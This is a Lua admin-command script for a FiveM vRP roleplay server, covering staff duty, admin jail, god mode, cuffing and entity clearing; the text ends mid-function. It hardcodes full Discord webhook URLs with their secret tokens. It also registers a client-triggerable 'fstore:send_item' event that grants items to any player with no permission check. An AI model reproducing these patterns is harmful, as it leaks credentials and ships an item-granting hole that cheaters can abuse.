local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")

vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP")

src = {}
Tunnel.bindInterface("vrp_admin",src)
Proxy.addInterface("vrp_admin",src)

vCLIENT = Tunnel.getInterface("vrp_admin")

local cfg = module("cfg/groups")
local groups = cfg.groups
local func = exports["vrp"]
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local aExpediente2 = {
	{ ['grupo1'] = "admin", ['grupo2'] = "adminoff"},
	{ ['grupo1'] = "developer", ['grupo2'] = "developeroff"},
	{ ['grupo1'] = "moderador", ['grupo2'] = "moderadoroff"},
	{ ['grupo1'] = "suporte", ['grupo2'] = "suporteoff"}
} 

RegisterCommand('deus',function(source,args,rawCommand)
	local source = source
	local user_id = vRP.getUserId(source)
	local identity = vRP.getUserIdentity(user_id)
	if user_id then
		for k,v in pairs(aExpediente2) do
			if vRP.hasGroup(user_id, v.grupo2) then
				vRP.addUserGroup(user_id, v.grupo1)
				TriggerClientEvent("Notify",source,"sucesso","[STAFF] Você entrou em Expediente.", 5)
				vRP.sendLog("https://discord.com/api/webhooks/1320744700252000286/0zofEHDIUXonErOSWKRMmryCZTZmoBR2cTCkils_rWpjbncY2FZZtfSuZKJVFCpoXb6j", "```css\n** BATER PONTO **\n"..os.date("[%d/%m/%Y as %X]").." ["..string.upper(v.grupo1).."] O(a) ["..identity.nome.." " ..identity.sobrenome.." ("..user_id..")] acabou de entrar em expediente.```")
			else
				if vRP.hasGroup(user_id, v.grupo1) then
					vRP.addUserGroup(user_id, v.grupo2)
					TriggerClientEvent("Notify",source,"negado","[STAFF] Você saiu do Expediente.", 5)
					vRP.sendLog("https://discord.com/api/webhooks/1320744815050358888/G9ibD66PlaAunFmR5Y8-bkmMoe2PItULu9B1sS2E9kFiI210_fQUzzAG-rWGtOcMFIIr", "```css\n** BATER PONTO **\n"..os.date("[%d/%m/%Y as %X]").." ["..string.upper(v.grupo1).."] O(a) ["..identity.nome.. " " ..identity.sobrenome.." ("..user_id..")] acabou de sair em expediente.```")
				end
			end
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- DV
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('dv',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") or vRP.hasPermission(user_id,"streamer2.permissao") or vRP.hasPermission(user_id,"perm.abelvolks") or vRP.hasPermission(user_id,"perm.policia") or vRP.hasPermission(user_id,"perm.hospital") then
        local vehicle = vRPclient.getNearestVehicle(source,7)
		if vehicle then
            TriggerClientEvent('deletarveiculo',source,vehicle)
		end
	end
end)


-----------------------------------------------------------------------------------------------------------------------------------------
-- ADICIONAR ITEM OFFLINE
-----------------------------------------------------------------------------------------------------------------------------------------
vRP.prepare("selectDataTable", "SELECT dvalue from vrp_user_data WHERE dkey = 'vRP:datatable' and user_id = @user_id")
vRP.prepare("updateDataTable", "UPDATE vrp_user_data SET dvalue = @dvalue WHERE user_id = @user_id")

lock = {}
RegisterServerEvent("fstore:send_item")
AddEventHandler("fstore:send_item",function(user_id, item, amount)
	while lock[user_id] do Wait(10) end

	lock[user_id] = true
	if lock[user_id] then
		local source = vRP.getUserSource(user_id)
		if source then
			print("FIVEM-STORE: Adicionado item: "..item.." "..amount.."x user_id: "..user_id.. " jogador: online")
			vRP.giveInventoryItem(user_id, item, amount, true)
		else
			local rows = vRP.query("selectDataTable", { user_id = user_id })
			if #rows > 0 then
				local decode = json.decode(rows[1].dvalue)
				local inventory = decode.inventory

				local count = 0
				repeat 
					count = count + 1
				until inventory[tostring(count)] == nil

				print("FIVEM-STORE: Adicionado item: "..item.." "..amount.."x user_id: "..user_id.. " slot: "..count.. " jogador: offline")

				inventory[tostring(count)] = { item = item, amount = amount }
				vRP.execute("updateDataTable", { user_id = user_id, dvalue = json.encode(decode) })
			
			else
				print("Ocorreu um problema ao entregar o item para o user_id: "..user_id)
			end
		end
	end

	lock[user_id] = nil
end)


-----------------------------------------------------------------------------------------------------------------------------------------
-- ADICIONAR CARRO NITRO
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('cnitro',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") then
		if tonumber(args[1]) then
			vRP.execute("vRP/add_vehicle",{ user_id = tonumber(args[1]), vehicle = "toyotasupra" })
			TriggerClientEvent('chatMessage', source, '^5O Você deu o veiculo nitro para o [ID: '..args[1]..']')
		end
	end
end)

local pradio = {}
RegisterCommand('pradio',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") then
		if args[1] then
			local players = exports['pma-voice']:getPlayersInRadioChannel(parseInt(args[1]))
			for source2, isTalking in pairs(players) do
				--print(('%s is in radio channel 1, isTalking: %s'):format(GetPlayerName(source), isTalking))
				local nid = vRP.getUserId(source2)
				table.insert(pradio, json.encode(nid))
			end
			TriggerClientEvent('chatMessage',source,"(Jogadores Conectados na Radio) ",{5, 230, 255},pradio)
			pradio = {}
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- TRYDELETEPED
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterServerEvent("trydeleteped")
AddEventHandler("trydeleteped",function(index)
	TriggerClientEvent("syncdeleteped",-1,index)
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- TRYDELETEOBJ
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterServerEvent("trydeleteobj")
AddEventHandler("trydeleteobj",function(index)
	local entity = NetworkGetEntityFromNetworkId(index)
    if entity and entity ~= 0 then 
        DeleteEntity(entity)
    end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- SISTEMA DE PRISAO ADMIN
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('prenderadm',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
	local idPlayer = vRP.prompt(source, "Digite o ID:", "")
		if tonumber(idPlayer) then
			local nplayer = vRP.getUserSource(tonumber(idPlayer))
			if nplayer then
				local tempoPrisao = vRP.prompt(source, "Digite o tempo da prisão", "")
				if tonumber(tempoPrisao) then
					local motivoPrisao = vRP.prompt(source, "Digite o motivo da prisão", "")
					if motivoPrisao ~= nil and motivoPrisao ~= "" then
						local nidentity = vRP.getUserIdentity(tonumber(idPlayer))
						if nidentity then
							TriggerClientEvent('chatMessage', -1, 'PRISÃO ADM', { 0, 0, 0 }, '^0 O ^3'.. nidentity.nome ..' '.. nidentity.sobrenome..' ^0 foi preso(a) por ^3'.. tonumber(tempoPrisao) ..' ^0minutos ^0 pelo motivo: ^3 '.. motivoPrisao)
							TriggerClientEvent('chatMessage', nplayer, 'PRISÃO ADM', { 0, 0, 0 }, '^0Você foi preso pelo admin: ^2'..GetPlayerName(source)..' ('..user_id..')^0.')
							vRPclient._teleport(nplayer, 1678.6,2513.39,45.57)
							prison_lock_adm(tonumber(idPlayer))
							TriggerClientEvent('prisaoADM',nplayer,true)
							vRP.setUData(tonumber(idPlayer),"vRP:prisao:ADM", json.encode(tonumber(tempoPrisao)))
							vRP.sendLog("https://discord.com/api/webhooks/1319755229532520458/IsasBg4G9OhAHgiyEtK78XtlkCRbZnr3QzBP1SziIpvUCVtuLxyhJK5HMcKcdCf6c_C1", "O ADMIN "..user_id.." PRENDEU O ID: "..idPlayer.."PELO MOTIVO: "..motivoPrisao)
							vRP.clearInventory(tonumber(idPlayer))
							TriggerClientEvent("Notify",nplayer, "importante","Os guardas apreenderam seus itens.", 5)
						end
					else
						TriggerClientEvent('chatMessage', source, '^2Digite o Motivo Corretamente.')
					end
				else
					TriggerClientEvent('chatMessage', source, '^2Digite o Tempo da Prisao Corretamente.')
				end
			else
				local tempoPrisao = vRP.prompt(source, "Digite o tempo da prisão", "")
				if tonumber(tempoPrisao) then
					local motivoPrisao = vRP.prompt(source, "Digite o motivo da prisão", "")
					if motivoPrisao ~= nil and motivoPrisao ~= "" then
						TriggerClientEvent('chatMessage', source, '** Jogador Offline ** ^2 Você prendeu '..idPlayer..' por '..tempoPrisao..' mese(s)')
						vRP.setUData(tonumber(idPlayer),"vRP:prisao:ADM", json.encode(tonumber(tempoPrisao)))
						vRP.sendLog("https://discord.com/api/webhooks/1319755229532520458/IsasBg4G9OhAHgiyEtK78XtlkCRbZnr3QzBP1SziIpvUCVtuLxyhJK5HMcKcdCf6c_C1", "O ADMIN "..user_id.." PRENDEU O ID: "..idPlayer.."PELO MOTIVO: "..motivoPrisao)
					end
				end
			end
		else
			TriggerClientEvent('chatMessage', source, '^2Digite o ID Do player Corretamente.')
		end
	end
end)

--------------------------------------------------------------------------------------------------------------------------------------------------
-- PRISÃO ADM
--------------------------------------------------------------------------------------------------------------------------------------------------
AddEventHandler("vRP:playerSpawn",function(user_id,source,first_spawn)
	if source then
		local value = vRP.getUData(parseInt(user_id),"vRP:prisao:ADM")
		local tempo = json.decode(value)
		if tempo ~= nil then 
			if tempo == nil then tempo = 0 end

			if parseInt(tempo) > 0 then
				TriggerClientEvent('prisaoADM',source,true)
				vRPclient.teleport(source, 1678.6,2513.39,45.5)
				prison_lock_adm(parseInt(user_id))
			end
		end
	end
end)

function prison_lock_adm(target_id)
	local player = vRP.getUserSource(parseInt(target_id))
	if player then
		SetTimeout(60000,function()
			local value = vRP.getUData(parseInt(target_id),"vRP:prisao:ADM")
			local tempo = json.decode(value) or 0
			if parseInt(tempo) >= 1 then
				TriggerClientEvent('chatMessage', player, 'PRISAO ADM', { 0, 0, 0 }, '^0Você Ainda vai passar ^5'..parseInt(tempo)..'m^0 preso.')
				vRP.setUData(parseInt(target_id),"vRP:prisao:ADM",json.encode(parseInt(tempo)-1))
				prison_lock_adm(parseInt(target_id))
				vRPclient._setHealth(player,300)
				vRP.setHunger(parseInt(target_id), 0)
				vRP.setThirst(parseInt(target_id), 0)
			elseif parseInt(tempo) == 0  or parseInt(tempo) == -1 then
				TriggerClientEvent('prisaoADM',player,false)
				vRPclient.teleport(player, 1847.94,2586.04,45.68)
				vRP.setUData(parseInt(target_id),"vRP:prisao:ADM",json.encode(-1))
			end
		end)
	end
end

-----------------------------------------------------------------------------------------------------------------------------------------
-- FIX
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('fix',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"perm.fixvip") then
		local vehicle = vRPclient.getNearestVehicle(source,7)
		if vehicle then
			TriggerClientEvent('reparar',source,vehicle)
		end
	end
end)  

RegisterCommand('reparar', function(source,args)
	local user_id = vRP.getUserId(source)
	if user_id then
		if not vRPclient.isInVehicle(source) then
			local vehicle = vRPclient.getNearestVehicle(source, 7)
			if vRP.hasPermission(user_id, "perm.mecanico") or vRP.hasPermission(user_id, "perm.policia") or vRP.hasPermission(user_id, "perm.hospital") or vRP.hasPermission(user_id, "perm.fixvip") then
				vRPclient._playAnim( source, false, {{"mini@repair", "fixing_a_player"}}, true )
				TriggerClientEvent("progress", source, 30)
				func:setBlockCommand(user_id, 35)
				SetTimeout(30000,function()
					TriggerClientEvent("reparar", source, vehicle)
					vRPclient._stopAnim(source, false)
					TriggerClientEvent( "Notify", source, "sucesso", "Você reparou o veiculo.", 5 )
				end)
			end
		else
			TriggerClientEvent( "Notify", source, "negado", "Precisa estar próximo ou fora do veículo para efetuar os reparos.", 5 )
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- STATUS 2
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('status2',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	local mensagem = ""
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		if user_id then

			--[[ ADMINISTRADOR ]]
			local admin = vRP.getUsersByPermission("admin.permissao")
			local adminTotal = ""
			for k,v in pairs(admin) do
				adminTotal = adminTotal.. parseInt(v)..", "
			end
			if adminTotal == "" then adminTotal = "Nenhum(a)" end
			mensagem = mensagem.."<br><br> <b>👑 IDS de Admin em Serviço: </b>"..adminTotal

			--[[ MODERADOR ]]
			local moderador = vRP.getUsersByPermission("moderador.permissao")
			local moderadorTotal = ""
			for k,v in pairs(moderador) do
				moderadorTotal = moderadorTotal.. parseInt(v)..", "
			end
			if moderadorTotal == "" then moderadorTotal = "Nenhum(a)" end
			mensagem = mensagem.."<br><b>🛡️ IDS de Moderador em Serviço: </b>"..moderadorTotal

			--[[ SUPORTE ]]
			local suporte = vRP.getUsersByPermission("suporte.permissao")
			local suporteTotal = ""
			for k,v in pairs(suporte) do
				suporteTotal = suporteTotal.. parseInt(v)..", "
			end
			if suporteTotal == "" then suporteTotal = "Nenhum(a)" end
			mensagem = mensagem.."<br><b>📑 IDS de Suporte em Serviço: </b>"..suporteTotal

			--[[ STAFF FORA DE SERVICO ]]
			local adminFora = vRP.getUsersByPermission("staffoff.permissao")
			local adminForaTotal = ""
			for k,v in pairs(adminFora) do
				adminForaTotal = adminForaTotal.. parseInt(v)..", "
			end
			if adminForaTotal == "" then adminForaTotal = "Nenhum(a)" end
			mensagem = mensagem.."<br><b>👑 IDS de STAFFs fora de Serviço: </b>"..adminForaTotal

			--[[ POLICIAIS ]]
			local policiais = vRP.getUsersByPermission("perm.policia")
			local totalPolicia = ""
			for k,v in pairs(policiais) do
				totalPolicia = totalPolicia.. parseInt(v)..", "
			end
			if totalPolicia == "" then totalPolicia = "Nenhum(a)" end
			mensagem = mensagem.."<br><br> <b>👮 IDS de Policiais: </b>"..totalPolicia

			local totalPoliciaPtr = ""
			for k,v in pairs(policiais) do
				totalPoliciaPtr = totalPoliciaPtr.. parseInt(v)..", "
			end
			if totalPoliciaPtr == "" then totalPoliciaPtr = "Nenhum(a)" end
			mensagem = mensagem.."<br> <b>👮 IDS de Policiais em PTR: </b>"..totalPoliciaPtr

			--[[ UNIZK ]]
			local unizk = vRP.getUsersByPermission("perm.hospital")
			local unizkTotal = ""
			for k,v in pairs(unizk) do
				unizkTotal = unizkTotal.. parseInt(v)..", "
			end
			if unizkTotal == "" then unizkTotal = "Nenhum(a)" end
			mensagem = mensagem.."<br><br> <b>⛑️ IDS de HOSPITAL: </b>"..unizkTotal

			local totalUnizkPtr = ""
			for k,v in pairs(unizk) do
				totalUnizkPtr = totalUnizkPtr.. parseInt(v)..", "
			end
			if totalUnizkPtr == "" then totalUnizkPtr = "Nenhum(a)" end
			mensagem = mensagem.."<br> <b>⛑️ IDS de HOSPITAL em PTR: </b>"..totalUnizkPtr

			--[[ MECANICO ]]
			local mec = vRP.getUsersByPermission("perm.texasrace")
			local mecTotal = ""
			for k,v in pairs(mec) do
				mecTotal = mecTotal.. parseInt(v)..", "
			end
			if mecTotal == "" then mecTotal = "Nenhum(a)" end
			mensagem = mensagem.."<br><br> <b>🔧 IDS de MECANICO: </b>"..mecTotal

			local totalMecPtr = ""
			for k,v in pairs(mec) do
				totalMecPtr = totalMecPtr.. parseInt(v)..", "
			end
			if totalMecPtr == "" then totalMecPtr = "Nenhum(a)" end
			mensagem = mensagem.."<br> <b>🔧 IDS de MECANICO em PTR: </b>"..totalMecPtr

			local onlinePlayers = GetNumPlayerIndices()
			mensagem = mensagem.."<br><br> <b>🏘️ Total de jogadores Online: </b>"..onlinePlayers

			TriggerClientEvent("Notify",source,"importante","<b>GOIAS RP:</b>"..mensagem, 60)
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- PFARDA
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('pfarda',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		local custom = vRPclient.getCustomization(source,{})
		local content = ""
		for k,v in pairs(custom) do
			if tonumber(k) == 1 or tonumber(k) == 3 or tonumber(k) == 4 or tonumber(k) == 6 or tonumber(k) == 7 or tonumber(k) == 8 or tonumber(k) == 9 or tonumber(k) == 11 or k == "p0" or k == "p6" then
				content = content.."\n["..k.."] = { "..json.encode(v).." }"
			end
		end
		
		vRP.prompt(source, "Farda: ", "[FARDA TAL] = { "..content.." \n} ")
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- PARTICULAR
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('pm',function(source,args,rawCommand)
    local source = source
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"developer.permissao") then
		if args[1] then
			local mensagem = vRP.prompt(source,"Mensagem:","")
			if mensagem == "" then
				return
			end
			local tplayer = vRP.getUserSource(parseInt(args[1]))
			
			if tplayer then
				TriggerClientEvent('chatMessage',tplayer,"(Privado Atendimento)",{5, 230, 255},mensagem)
			end
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- TRYAREA
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('limpararea',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	local plyCoords = GetEntityCoords(GetPlayerPed(source))
    local x,y,z = plyCoords[1],plyCoords[2],plyCoords[3]

	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		TriggerClientEvent("syncarea",-1,x,y,z)
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- Limpar Inventario
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('clearinv',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") then
		if args[1] then
			local nplayer = vRP.getUserSource(parseInt(args[1]))
			if nplayer then
				vRP.clearInventory(parseInt(args[1]))

				vRP.sendLog("https://discord.com/api/webhooks/983710398161231892/52T371tSu6ILRsydL4KDfpGfyZhy6Tyx__J9Xkn4O90IT7wIWh940nt-x3cyUGDkSrIK", "O ID: "..user_id.. " limpou o inventario do ID: "..args[1])
			end
		else
			vRP.clearInventory(user_id)
			vRP.sendLog("https://discord.com/api/webhooks/983710398161231892/52T371tSu6ILRsydL4KDfpGfyZhy6Tyx__J9Xkn4O90IT7wIWh940nt-x3cyUGDkSrIK", "O ID: "..user_id.. " limpou o inventario do ID: "..user_id)
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- GOD
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('god',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id, "perm.god") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") or vRP.hasPermission(user_id,"streamer.permissao") or vRP.hasPermission(user_id,"perm.spawner") then
		if args[1] then
			local nplayer = vRP.getUserSource(parseInt(args[1]))
			if nplayer then
				vRPclient._killGod(nplayer)
				vRPclient._setHealth(nplayer,300)
				vRP.varyThirst(nplayer,-100)
				vRP.varyHunger(nplayer,-100)
				vRP.sendLog("https://discord.com/api/webhooks/1322570345026289714/pO3EsX04RTGKvJ0QXgBUT6POoMsaEXCmT3pLUHuX9TVCb-xhtoWFc5dWkpegK27ZHDsN", "O ID "..user_id.." usou o /god no ID "..parseInt(args[1]).."")
			end
		else
			vRPclient._killGod(source)
			vRPclient._setHealth(source,300)
			vRP.sendLog("GOD", "O ID "..user_id.." usou o /god ")
			vRP.varyThirst(user_id,-100)
			vRP.varyHunger(user_id,-100)
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- CUFF
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('cuff',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		if args[1] then
			local nplayer = vRP.getUserSource(parseInt(args[1]))
			if nplayer then
				vRPclient._toggleHandcuff(nplayer)
			end
		else
			vRPclient._toggleHandcuff(source)
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- CAPUZ
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('capuz',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		if args[1] then
			local nplayer = vRP.getUserSource(parseInt(args[1]))
			if nplayer then
				vRPclient.setCapuz(nplayer, false)
			end
		else
			vRPclient.setCapuz(source, false)
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- KILL
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('kill',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") then
		if args[1] then
			local nplayer = vRP.getUserSource(parseInt(args[1]))
			if nplayer then
				vRPclient._setHealth(nplayer, 0)
				SetTimeout(1000, function()
					vRPclient._killComa(nplayer)
				end)

				vRP.sendLog("KILL", "O ID "..user_id.." usou o /kill no ID "..parseInt(args[1]).."")
			end
		else
			vRPclient._setHealth(source, 0)
			SetTimeout(1000, function()
				vRPclient._killComa(source)
			end)
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- PON
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('pon',function(source,args,rawCommand)
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id,"admin.permissao") then
        local users = vRP.getUsers()
        local players = ""
        local quantidade = 0
        for k,v in pairs(users) do
            if k ~= #users then
                players = players..", "
            end
            players = players..k
            quantidade = quantidade + 1
        end
        TriggerClientEvent('chatMessage',source,"TOTAL ONLINE",{255,160,0},quantidade)
        TriggerClientEvent('chatMessage',source,"ID's ONLINE",{255,160,0},players)
    end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- Zerar fome e sede
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('good',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		if args[1] then
			local nplayer = vRP.getUserSource(parseInt(args[1]))
			if nplayer then
				vRP.setHunger(parseInt(args[1]), 0)
				vRP.setThirst(parseInt(args[1]), 0)
				vRPclient._setHealth(nplayer, 300)
			end
		else
			vRP.setHunger(user_id, 0)
			vRP.setThirst(user_id, 0)
			vRPclient._setHealth(source, 300)
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- PARAALL
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('parall', function(source, args, rawCommand)
	local user_id = vRP.getUserId(source)
	if user_id ~= nil then
		local player = vRP.getUserSource(user_id)
		if vRP.hasPermission(user_id,"admin.permissao") then
			TriggerClientEvent("nzk:giveParachute", -1)
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- AA
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('aa', function(source, args, raw)
	local text = string.sub(raw, 4)
	local user_id = vRP.getUserId(source)
	if user_id ~= nil then
		if vRP.hasPermission(user_id,"perm.developer") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
			local admin = vRP.getUsersByPermission("ticket.permissao")
			for l,w in pairs(admin) do
				local player = vRP.getUserSource(parseInt(w))
				vRPclient._playSound(player,"Event_Message_Purple","GTAO_FM_Events_Soundset")
				TriggerClientEvent('chatMessage', player, '^7**ADMIN CHAT** ^1('..user_id..') diz:  '..text)
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- TPALL
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('tpall', function(source, args, rawCommand)
	local user_id = vRP.getUserId(source)
	if user_id ~= nil then
		local player = vRP.getUserSource(user_id)
		if vRP.hasPermission(user_id,"developer.permissao") then
			local plyCoords = GetEntityCoords(GetPlayerPed(player))
            local x,y,z = plyCoords[1],plyCoords[2],plyCoords[3]
			
			TriggerClientEvent("nzk:tpall", -1, x, y, z)
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- REMOVER DETENCAO VEICULO
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('rdet', function(source, args, rawCommand)
	local user_id = vRP.getUserId(source)
	if user_id ~= nil then
		local player = vRP.getUserSource(user_id)
		if vRP.hasPermission(user_id,"admin.permissao") then
			if tonumber(args[1]) and args[2] then
				vRP.execute("vRP/set_detido",{ user_id = tonumber(args[1]), vehicle = args[2], detido = 0})
				TriggerClientEvent('chatMessage', source, '^2Você removeu o veiculo '..args[2]..' do [ID: '..tonumber(args[1])..'] da detencao/retencao.')
			end
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- SPECTADE
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('spec', function(source, args, rawCommand)
	local user_id = vRP.getUserId(source)
	if user_id ~= nil then
		if vRP.hasPermission(user_id,"perm.user") or vRP.hasPermission(user_id,"moderador.permissao") then
			if tonumber(args[1]) == 0 or tonumber(args[1]) == user_id then
				vRPclient._stopSpec(source)
			else
				local nplayer = vRP.getUserSource(tonumber(args[1]))
				if nplayer then
					vRPclient._toggleSpec(source, nplayer)
				end
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- Deleta todos Carros
---------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('clearallveh', function(source, args, rawCommand)
	local user_id = vRP.getUserId(source)
	if user_id ~= nil then
		if vRP.hasPermission(user_id,"perm.developer") then
			TriggerClientEvent('chatMessage', -1, "^1ADMIN: ^0Contagem Iniciada ^260s^0 para limpeza de veiculos. (Entre em seu veiculo para não ser removido)")
			Wait(60000)

			local deleteCount = 0
			local entityList = {}
            for k,v in ipairs(GetAllVehicles()) do 
                local ped = GetPedInVehicleSeat(v, -1)
                if not ped or ped <= 0 then 
                    DeleteEntity(v)

					if GetEntityScript(v) ~= nil then
						if not entityList[GetEntityScript(v)] then entityList[GetEntityScript(v)] = 0 end
						entityList[GetEntityScript(v)] = entityList[GetEntityScript(v)] + 1
					end

                    deleteCount = deleteCount + 1
                end
            end

			print(json.encode(entityList, { indent = true }))
			TriggerClientEvent('chatMessage', -1, "^1ADMIN: ^0"..deleteCount.." veiculo deletados!")
		end
	end
end)

RegisterCommand('admincv', function(source, args, rawCommand)
	if source == 0 then
		local deleteCount = 0
		for k,v in ipairs(GetAllVehicles()) do 
			DeleteEntity(v)
			
			deleteCount = deleteCount + 1
		end

		TriggerClientEvent('chatMessage', -1, "^1ADMIN: ^0"..deleteCount.." veiculo deletados!")
	end
end)


RegisterCommand('clearallobj', function(source, args, rawCommand)
	local user_id = vRP.getUserId(source)
	if user_id ~= nil then
		if vRP.hasPermission(user_id,"developer.permissao") then
			local deleteCount = 0
			local entityList = {}
			for k,v in ipairs(GetAllObjects()) do 
				DeleteEntity(v)

				if GetEntityScript(v) ~= nil then
					if not entityList[GetEntityScript(v)] then entityList[GetEntityScript(v)] = 0 end
					entityList[GetEntityScript(v)] = entityList[GetEntityScript(v)] + 1
				end

				deleteCount = deleteCount + 1
			end

			print(json.encode(entityList, { indent = true }))
			TriggerClientEvent('chatMessage', -1, "^1ADMIN: ^0"..deleteCount.." objetos deletados!")
		end
	end
end)

CreateThread(function()
	while true do

		local obj_count = 0
		for k,v in ipairs(GetAllObjects()) do 
			if DoesEntityExist(v) then
				DeleteEntity(v)
				obj_count = obj_count + 1
			end
		end
		print("Objetos Deletados: "..obj_count)

		Wait( 5 * 60 * 1000 )
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- HASH2
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('hash2',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") then
		local vehicle = vRPclient.getNearestVehicle(source,7)
		if vehicle then
			vRP.prompt(source, "Hash Veiculo: ", vCLIENT.returnHashVeh(source,vehicle))
		end
	end
end)

RegisterCommand('schack',function(source,args,command)
	local user_id = vRP.getUserId(source)
	if(vRP.hasPermission(user_id,"player.noclip"))then
	  TriggerClientEvent("MQCU:getfodido",source)
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- RESET CHAR
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('rchar',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"developer.permissao") then
		if args[1] then
			local nplayer = vRP.getUserSource(parseInt(args[1]))
			if nplayer then
				vRP.execute("vRP/set_controller",{ user_id = parseInt(args[1]), controller = 0, rosto = "{}", roupas = "{}" })
				vRP.kick(parseInt(args[1]),"\n[ADMIN] Você foi kickado \n entre novamente para fazer sua aparencia")
				TriggerClientEvent("Notify",source,"sucesso","Você resetou o ID - "..parseInt(args[1])..".", 5)
			else
				vRP.execute("vRP/set_controller",{ user_id = parseInt(args[1]), controller = 0, rosto = "{}", roupas = "{}" })
				TriggerClientEvent("Notify",source,"sucesso","Você resetou o ID - "..parseInt(args[1])..".", 5)
			end

